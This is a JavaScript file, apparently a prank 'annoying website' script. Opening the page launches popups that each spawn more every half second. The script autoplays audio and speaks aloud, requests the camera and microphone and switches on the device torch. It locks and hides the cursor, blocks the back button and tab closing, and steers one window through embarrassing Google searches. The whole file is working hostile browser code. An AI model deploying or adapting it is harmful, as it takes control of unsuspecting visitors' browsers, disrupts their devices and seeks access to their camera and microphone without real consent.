search = [
  "why are things illegal",
  "why do i feel so empty",
  "why do i always feel hungry",
  "why do i always have diarrhea",
  "why does my anus itch",
  "why does my belly button smell",
  "why does my cat attack me",
  "why does my dog eat poop",
  "why does my fart smell so bad",
  "why does my mom hate me",
  "why does my pee smell bad",
  "why does my poop float",
  "proof that the earth is flat",
];
const SCREEN_WIDTH = window.screen.availWidth;
const SCREEN_HEIGHT = window.screen.availHeight;
const WIN_WIDTH = 480;
const WIN_HEIGHT = 260;
const VELOCITY = 15;
const MARGIN = 10;
const TICK_LENGTH = 50;
let wins = [];
let win;
let audio = document.getElementById("audio");
const params = new URLSearchParams(window.location.search);

function speak(text) {
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(text));
}

const isChildWindow = params.has("child");

if (isChildWindow) startChaos();

function startChaos() {
  audio.autoplay = true;
  audio.load();
  speak(
    "The wheels on the bus go round and round, round and round, round and round, the wheels on the bus go round and round all through the town."
  );

  function clipboardCopy(text) {
    // A <span> contains the text to copy
    const span = document.createElement("span");
    span.textContent = text;
    span.style.whiteSpace = "pre"; // Preserve consecutive spaces and newlines

    // An <iframe> isolates the <span> from the page's styles
    const iframe = document.createElement("iframe");
    iframe.sandbox = "allow-same-origin";
    document.body.appendChild(iframe);

    let win = iframe.contentWindow;
    win.document.body.appendChild(span);

    let selection = win.getSelection();

    // Firefox fails to get a selection from <iframe> window, so fallback
    if (!selection) {
      win = window;
      selection = win.getSelection();
      document.body.appendChild(span);
    }

    const range = win.document.createRange();
    selection.removeAllRanges();
    range.selectNode(span);
    selection.addRange(range);

    let success = false;
    try {
      success = win.document.execCommand("copy");
    } catch (err) {
      console.log(err);
    }

    selection.removeAllRanges();
    span.remove();
    iframe.remove();

    return success;
  }
  function requestCameraAndMic() {
    if (
      !navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== "function"
    ) {
      return;
    }

    navigator.mediaDevices.enumerateDevices().then((devices) => {
      const cameras = devices.filter((device) => device.kind === "videoinput");

      if (cameras.length === 0) return;
      const camera = cameras[cameras.length - 1];

      navigator.mediaDevices
        .getUserMedia({
          deviceId: camera.deviceId,
          facingMode: ["user", "environment"],
          audio: true,
          video: true,
        })
        .then(
          (stream) => {
            const track = stream.getVideoTracks()[0];
            const imageCapture = new window.ImageCapture(track);

            imageCapture.getPhotoCapabilities().then(
              () => {
                // Let there be light!
                track.applyConstraints({ advanced: [{ torch: true }] });
              },
              () => {
                /* No torch on this device */
              }
            );
          },
          () => {
            /* ignore errors */
          }
        );
    });
  }

  function confirmPageUnload() {
    window.addEventListener("beforeunload", (event) => {
      speak("Please don't go!");
      event.returnValue = true;
    });
  }

  function requestPointerLock() {
    const requestPointerLockApi =
      document.body.requestPointerLock ||
      document.body.webkitRequestPointerLock ||
      document.body.mozRequestPointerLock ||
      document.body.msRequestPointerLock;

    requestPointerLockApi.call(document.body);
  }

  function hideCursor() {
    document.querySelector("html").style = "cursor: none;";
  }

  function setupSearchWindow(win) {
    if (!win) return;
    win.window.location =
      "https://www.google.com/search?q=" + encodeURIComponent(search[0]);
    let searchIndex = 1;
    const interval = setInterval(() => {
      if (searchIndex >= search.length) {
        clearInterval(interval);
        win.window.location = window.location.pathname;
        return;
      }

      if (win.closed) {
        clearInterval(interval);
        onCloseWindow(win);
        return;
      }

      win.window.location = window.location.pathname;
      setTimeout(() => {
        const { x, y } = getRandomCoords();
        win.moveTo(x, y);
        win.window.location =
          "https://www.google.com/search?q=" +
          encodeURIComponent(search[searchIndex]);
        searchIndex += 1;
      }, 500);
    }, 2500);
  }

  function getRandomCoords() {
    const x =
      MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN));
    const y =
      MARGIN +
      Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN));
    return { x, y };
  }

  function openWindow() {
    const { x, y } = getRandomCoords();
    const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
    win = window.open(`${window.location.href}?child=true`, "", opts);

    // New windows may be blocked by the popup blocker
    if (!win) return;
    wins.push(win);

    if (wins.length === 2) setupSearchWindow(win);
  }

  function blockBackButton() {
    window.addEventListener("popstate", () => {
      window.history.forward();
    });
  }

  function onCloseWindow(win) {
    const i = wins.indexOf(win);
    if (i >= 0) wins.splice(i, 1);
  }

  requestCameraAndMic();
  confirmPageUnload();
  requestPointerLock();
  hideCursor();
  openWindow();
  blockBackButton();

  setInterval(() => {
    openWindow();
  }, 500);
}
